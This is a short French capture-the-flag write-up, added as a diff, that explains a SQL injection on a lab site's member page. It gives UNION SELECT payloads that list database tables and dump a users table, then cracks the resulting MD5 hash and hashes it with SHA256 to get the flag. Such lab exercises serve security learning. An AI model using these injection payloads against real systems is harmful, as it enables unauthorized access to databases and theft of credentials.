@@ -1,0 +1,10 @@
+Sur la page /index.php?page=member nous pouvons faire des injections sql.
+1/ Il nous faut donc d'abord récupérer l'architecture de la base. Pour cela, nous faisons la requête :
+  1=1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
+2/ Nous pouvons accéder à la table "users". Deux colonnes sont intéressantes : countersign et Commentaire
+  Voici donc la requête : 1=1 UNION SELECT countersign, Commentaire FROM users
+  Le user avec l'id 5 qui se nomme "Get The Flag" donne comme résultat :
+  countersign = 5ff9d0165b4f92b14994e5c685cdce28 et Commentaire = Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+3/ Après un dehash en md5 de 5ff9d0165b4f92b14994e5c685cdce28 grâce à https://md5decrypt.net/ nous trouvons "FortyTwo".
+  En passant tout en minuscule puis en hashant fortytwo en SHA256 grâce à https://md5decrypt.net/Sha256 on trouve 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+4/ And it's god !
